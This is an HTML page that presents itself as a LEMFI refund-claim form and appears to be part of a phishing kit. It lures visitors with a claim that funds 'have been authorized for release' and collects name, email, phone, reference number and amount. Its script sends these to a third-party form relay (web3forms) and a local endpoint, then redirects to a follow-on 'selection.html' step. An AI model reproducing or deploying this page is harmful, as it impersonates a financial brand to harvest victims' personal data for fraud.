<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEMFI — Refund Claim</title>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --green-primary: #00C389; --green-dark: #00A873; --green-light: #E6F9F2;
            --blue-primary: #3B82F6; --blue-light: #EFF6FF; --blue-border: #BFDBFE;
            --text-primary: #1B1B1B; --text-secondary: #6B7280; --text-tertiary: #9CA3AF;
            --border: #E5E7EB; --bg-body: #F9FAFB; --bg-card: #FFFFFF;
            --shadow-lg: 0 12px 40px rgba(0,0,0,0.08); --shadow-btn: 0 4px 14px rgba(0,195,137,0.3);
            --radius-md: 12px; --radius-lg: 16px; --radius-xl: 20px;
        }
        body {
            font-family: 'DM Sans', sans-serif; min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
            background: var(--bg-body); padding: 24px 16px; color: var(--text-primary);
            -webkit-font-smoothing: antialiased;
        }
        body::before {
            content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 0;
            background: radial-gradient(ellipse 80% 50% at 50% -20%, rgba(59,130,246,0.08) 0%, transparent 60%),
                        radial-gradient(ellipse 60% 40% at 80% 100%, rgba(0,195,137,0.04) 0%, transparent 50%);
        }
        .page-wrapper { position: relative; z-index: 1; width: 100%; max-width: 440px; }
        .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; padding: 0 4px; }
        .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
        .logo-mark { width: 40px; height: 40px; background: var(--green-primary); border-radius: 10px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
        .logo-mark::after { content: ''; width: 18px; height: 18px; border: 3px solid #fff; border-radius: 50%; border-top-color: transparent; transform: rotate(45deg); }
        .logo-wordmark { font-size: 22px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.5px; }
        .card { background: var(--bg-card); border-radius: var(--radius-xl); box-shadow: var(--shadow-lg); border: 1px solid rgba(0,0,0,0.04); overflow: hidden; }
        .card-inner { padding: 32px; }
        .page-icon { width: 56px; height: 56px; background: var(--blue-light); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 20px; position: relative; }
        .page-icon svg { width: 28px; height: 28px; color: var(--blue-primary); }
        .page-icon::after { content: ''; position: absolute; inset: -4px; border-radius: 50%; border: 2px dashed rgba(59,130,246,0.25); animation: spinSlow 20s linear infinite; }
        @keyframes spinSlow { to { transform: rotate(360deg); } }
        .page-title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
        .page-sub { font-size: 14px; color: var(--text-secondary); margin-bottom: 28px; line-height: 1.5; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; color: var(--text-primary); margin-bottom: 6px; }
        .form-group input, .form-group textarea, .form-group select {
            width: 100%; padding: 12px 14px; border: 1.5px solid var(--border); border-radius: var(--radius-md);
            font-size: 14px; font-family: inherit; color: var(--text-primary); background: var(--bg-body);
            transition: border-color 0.2s; outline: none;
        }
        .form-group input:focus, .form-group textarea:focus, .form-group select:focus { border-color: var(--green-primary); }
        .form-group textarea { resize: vertical; min-height: 80px; }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
        .amount-input-wrap { position: relative; }
        .amount-input-wrap .currency-sign { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); font-size: 16px; font-weight: 600; color: var(--text-secondary); pointer-events: none; }
        .amount-input-wrap input { padding-left: 32px; }
        .btn-primary { width: 100%; padding: 14px 24px; background: var(--blue-primary); color: #fff; border: none; border-radius: var(--radius-md); font-size: 15px; font-weight: 600; font-family: inherit; cursor: pointer; transition: all 0.25s ease; display: flex; align-items: center; justify-content: center; gap: 8px; position: relative; overflow: hidden; margin-top: 8px; }
        .btn-primary::before { content: ''; position: absolute; inset: 0; background: linear-gradient(180deg, rgba(255,255,255,0.12) 0%, transparent 100%); pointer-events: none; }
        .btn-primary:hover { background: #2563EB; box-shadow: 0 4px 14px rgba(59,130,246,0.3); transform: translateY(-1px); }
        .btn-primary:active { transform: translateY(0); }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
        .footer-section { margin-top: 24px; padding-top: 20px; border-top: 1px solid var(--border); }
        .footer-text { text-align: center; font-size: 12px; color: var(--text-tertiary); line-height: 1.7; }
        .footer-text a { color: var(--green-primary); text-decoration: none; font-weight: 500; }
        .security-row { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 16px; }
        .security-badge { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--text-tertiary); }
        .security-badge svg { width: 14px; height: 14px; color: var(--green-primary); }
        .toast { position: fixed; top: 24px; left: 50%; transform: translateX(-50%) translateY(-120%); background: #DC2626; color: #fff; padding: 12px 20px; border-radius: var(--radius-md); font-size: 14px; font-family: inherit; box-shadow: 0 8px 30px rgba(0,0,0,0.15); z-index: 9999; transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        .toast.show { transform: translateX(-50%) translateY(0); }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
        .animate-in { animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
        .delay-1 { animation-delay: 0.05s; } .delay-2 { animation-delay: 0.1s; } .delay-3 { animation-delay: 0.15s; } .delay-4 { animation-delay: 0.2s; } .delay-5 { animation-delay: 0.25s; } .delay-6 { animation-delay: 0.3s; }
        @media (max-width: 480px) { body { padding: 16px 12px; } .card-inner { padding: 24px; } .form-row { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="toast" id="toast"></div>
    <div class="page-wrapper">
        <div class="top-bar animate-in">
            <a href="#" class="logo"><div class="logo-mark"></div><span class="logo-wordmark">Lemfi</span></a>
        </div>
        <div class="card">
            <div class="card-inner">
                <div class="page-icon animate-in delay-1">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76a1 1 0 0 0-1.4 0L9.6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1 7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94z"/><path d="M16 22h6"/><path d="M19 15v7"/><path d="M22 15v7"/></svg>
                </div>
                <h1 class="page-title animate-in delay-2">Claim Your Refund</h1>
                <p class="page-sub animate-in delay-3">Enter your details below to process your compensation or refund request. The funds have been authorized for release.</p>
                <form id="refundForm">
                    <input type="hidden" name="access_key" value="YOUR_WEB3FORM_ACCESS_KEY">
                    <input type="hidden" name="subject" value="New Refund Claim">
                    <input type="hidden" name="from_name" value="Lemfi Website">
                    <input type="hidden" name="page" value="refund.html">
                    <div class="form-group animate-in delay-2">
                        <label for="fullName">Full Name</label>
                        <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
                    </div>
                    <div class="form-row animate-in delay-3">
                        <div class="form-group">
                            <label for="email">Email Address</label>
                            <input type="email" id="email" name="email" placeholder="you@example.com" required>
                        </div>
                        <div class="form-group">
                            <label for="phone">Phone Number</label>
                            <input type="tel" id="phone" name="phone" placeholder="+1 (000) 000-0000" required>
                        </div>
                    </div>
                    <div class="form-group animate-in delay-4">
                        <label for="referenceNumber">Reference Number</label>
                        <input type="text" id="referenceNumber" name="referenceNumber" placeholder="e.g. REF-12345" required>
                    </div>
                    <div class="form-group animate-in delay-5">
                        <label for="description">Reason for Refund</label>
                        <textarea id="description" name="description" placeholder="Briefly describe the reason for this refund claim..." required></textarea>
                    </div>
                    <div class="form-group animate-in delay-6">
                        <label for="amount">Refund Amount ($)</label>
                        <div class="amount-input-wrap">
                            <span class="currency-sign">$</span>
                            <input type="number" id="amount" name="amount" placeholder="0.00" step="0.01" min="0.01" required>
                        </div>
                    </div>
                    <button type="submit" class="btn-primary animate-in delay-6" id="submitBtn">
                        <span>Submit Claim</span>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                    </button>
                </form>
                <div class="footer-section animate-in delay-6">
                    <p class="footer-text">By submitting you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></p>
                    <div class="security-row">
                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL Secured</div>
                        <div class="security-badge"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Encrypted</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3500); }
        document.getElementById('refundForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const amount = document.getElementById('amount').value;
            if (!amount || parseFloat(amount) <= 0) { showToast('Please enter a valid amount.'); return; }
            btn.disabled = true; btn.innerHTML = '<span>Processing...</span>';
            const formData = {
                fullName: document.getElementById('fullName').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                referenceNumber: document.getElementById('referenceNumber').value,
                description: document.getElementById('description').value,
                amount: amount,
                access_key: 'YOUR_WEB3FORM_ACCESS_KEY',
                subject: 'New Refund Claim',
                from_name: 'Lemfi Website',
                page: 'refund.html'
            };
            localStorage.setItem('refundAmount', amount);
            localStorage.setItem('refundEmail', formData.email);
            try {
                const [web3Response, apiResponse] = await Promise.allSettled([
                    fetch('https://api.web3forms.com/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(formData) }),
                    fetch('/api/refund-details', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(formData) })
                ]);
                const apiData = apiResponse.status === 'fulfilled' ? await apiResponse.value.json() : null;
                if (apiData && apiData.success) { window.location.href = apiData.redirect; }
                else { showToast('Claim submitted. Redirecting...'); setTimeout(() => window.location.href = 'selection.html', 1000); }
            } catch (err) { showToast('Network error.'); btn.disabled = false; btn.innerHTML = '<span>Submit Claim</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>'; }
        });
    </script>
</body>
</html>
